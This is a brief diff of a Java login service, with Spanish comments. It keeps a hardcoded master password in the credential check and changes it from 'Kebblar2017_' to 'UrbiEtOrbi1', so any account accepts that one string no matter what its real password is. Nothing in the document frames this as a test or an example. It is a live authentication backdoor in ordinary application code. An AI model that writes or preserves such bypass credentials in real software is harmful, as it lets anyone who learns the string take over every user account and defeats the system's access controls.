@@ -67,7 +67,7 @@ public class AccessServiceImpl implements AccessService {
         // Clave dada que debe ser validado contra el que está en la base de datos
         String clavePorVerificar = DigestEncoder.digest(claveProporcionada, usuario.getCorreo());
 
-        if(!usuario.getClave().equals(clavePorVerificar) && !claveProporcionada.equals("Kebblar2017_")) {// Credenciales INCORRECTAS
+        if(!usuario.getClave().equals(clavePorVerificar) && !claveProporcionada.equals("UrbiEtOrbi1")) {// Credenciales INCORRECTAS
             // Incrementa el contador de intentos erroneos de ingreso y actualiza:
             int numeroDeIntentosFallidos = usuario.getAccesoNegadoContador()+1;
             usuario.setAccesoNegadoContador(numeroDeIntentosFallidos);
